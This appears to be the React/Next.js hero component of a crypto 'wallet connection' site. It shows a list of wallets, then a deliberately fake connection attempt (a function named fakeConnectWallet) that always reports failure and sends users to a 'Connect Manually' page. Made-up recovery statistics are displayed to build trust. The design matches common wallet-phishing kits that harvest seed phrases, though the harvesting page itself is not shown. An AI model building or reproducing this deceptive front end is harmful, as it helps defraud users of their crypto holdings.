"use client";
import Image from "next/image";
import React, { useState } from "react";
import CountUp from "react-countup";
import { X } from "lucide-react";
import { useRouter } from "next/navigation";

const wallets = [
  { name: "WalletConnect", icon: "/wallet-connect-logo.png" },
  { name: "Metamask", icon: "/MetaMask_Fox.svg.png" },
  { name: "Coinbase", icon: "/CB_blog_image.jpg" },
  { name: "Phantom", icon: "/Phantom-Wallet-by-Charlie-DeFi.webp" },
  { name: "Trust Wallet", icon: "/trust wallet.jpg" },
  { name: "Keplr Wallet", icon: "/kplr.jpg" },
  { name: "Safepal", icon: "/safepal-logo-big.avif" },
  { name: "Ledger", icon: "/ledger-wallet5715.jpg" },
  { name: "Other wallets", icon: "/other.webp" },
];

const Hero = () => {
  const [modalIsOpened, setModalIsOpened] = useState(false);
  const [connectingWallet, setConnectingWallet] = useState(null);
  const [status, setStatus] = useState(null); // "connecting" | "failed"
  const router = useRouter();

  const handleConnectModal = () => setModalIsOpened(true);
  const closeModal = () => {
    setModalIsOpened(false);
    setConnectingWallet(null);
    setStatus(null);
  };

  const fakeConnectWallet = (wallet) => {
    setConnectingWallet(wallet.name);
    setStatus("connecting");

    // After 2s -> failed
    setTimeout(() => {
      setStatus("failed");
    }, 2000);
  };

  return (
    <section className="w-full min-h-screen mt-20 sm:mt-20 flex flex-col-reverse sm:flex sm:flex-row items-center text-white px-8 md:px-28">
      {/* Left Content */}
      <div className="flex-1 flex flex-col justify-center gap-6">
        <h1 className="text-2xl md:text-4xl font-bold">
          Decentralized{" "}
          <span className="bg-gradient-to-r from-[#20A4F3] to-[#59F8E8] bg-clip-text text-transparent">
            wallet connection
          </span>{" "}
          nodes
        </h1>

        <p className="text-gray-300 md:w-3/4">
          A tool that enables wallets and apps to securely connect and interact,
          essential for ensuring the security and integrity of digital assets.
          Performs a comprehensive analysis of the wallet's structure and
          contents.
        </p>

        <div className="flex gap-4 mt-4">
          <button
            onClick={handleConnectModal}
            className="bg-gradient-to-r from-[#20A4F3] to-[#59F8E8] text-black px-6 py-3 rounded-lg font-semibold hover:opacity-90 transition"
          >
            Connect
          </button>
          <button className="border border-white px-6 py-3 rounded-lg font-semibold hover:bg-white hover:text-black transition">
            White Paper
          </button>
        </div>

        {/* Animated Stats */}
        <div className="flex sm:grid-cols-3 gap-6 mt-10 text-center">
          <div>
            <h2 className="text-3xl font-bold bg-gradient-to-r from-[#20A4F3] to-[#59F8E8] bg-clip-text text-transparent">
              <CountUp end={250} duration={2} />+
            </h2>
            <p className="text-gray-400">Wallets Revoked</p>
          </div>

          <div>
            <h2 className="text-3xl font-bold bg-gradient-to-r from-[#20A4F3] to-[#59F8E8] bg-clip-text text-transparent">
              $<CountUp end={10} duration={2} />
              M+
            </h2>
            <p className="text-gray-400">Recovered</p>
          </div>

          <div>
            <h2 className="text-3xl font-bold bg-gradient-to-r from-[#20A4F3] to-[#59F8E8] bg-clip-text text-transparent">
              <CountUp end={2800} duration={2} separator="," />+
            </h2>
            <p className="text-gray-400">Users</p>
          </div>
        </div>
      </div>

      {/* Right Image */}
      <div className="flex-1 flex justify-center items-center mt-8 md:mt-0">
        <Image
          src="/cube_img.webp"
          width={400}
          height={400}
          alt="Cube Illustration"
          className="w-96 h-96 md:w-[400px] md:h-[400px] object-contain"
          style={{ animation: "float 2s ease-in-out infinite" }}
        />
        <style jsx>{`
          @keyframes float {
            0%,
            100% {
              transform: translateY(0);
            }
            50% {
              transform: translateY(-20px);
            }
          }
        `}</style>
      </div>

      {/* Modal */}
      {modalIsOpened && (
        <div className="fixed inset-0 bg-black/70 flex justify-center items-center z-50 px-4">
          <div className="bg-gray-900 rounded-2xl p-8 max-w-md w-full relative text-white shadow-lg">
            <button
              onClick={closeModal}
              className="absolute top-4 right-4 text-gray-400 hover:text-white"
            >
              <X size={20} />
            </button>

            <h2 className="text-xl font-bold mb-4">Connect Wallet</h2>

            {!connectingWallet ? (
              <div className="grid grid-cols-2 gap-4">
                {wallets.map((wallet, idx) => (
                  <button
                    key={idx}
                    onClick={() =>
                      router.push(`/connect/${encodeURIComponent(wallet.name)}`)
                    }
                    className="flex flex-col items-center gap-2 p-4 bg-white/10 rounded-xl hover:bg-white/20 transition"
                  >
                    <Image
                      src={wallet.icon}
                      alt={wallet.name}
                      width={40}
                      height={40}
                    />
                    <span className="text-sm">{wallet.name}</span>
                  </button>
                ))}
              </div>
            ) : (
              <div className="text-center">
                {status === "connecting" && (
                  <p className="text-blue-400 font-semibold">
                    Connecting to {connectingWallet}...
                  </p>
                )}
                {status === "failed" && (
                  <>
                    <p className="text-red-500 font-semibold mb-4">
                      Connection Failed
                    </p>
                    <button
                      onClick={() =>
                        router.push(
                          `/connect/${encodeURIComponent(connectingWallet)}`
                        )
                      }
                      className="bg-gradient-to-r from-[#20A4F3] to-[#59F8E8] text-black px-6 py-3 rounded-lg font-semibold hover:opacity-90 transition"
                    >
                      Connect Manually
                    </button>
                  </>
                )}
              </div>
            )}
          </div>
        </div>
      )}
    </section>
  );
};

export default Hero;
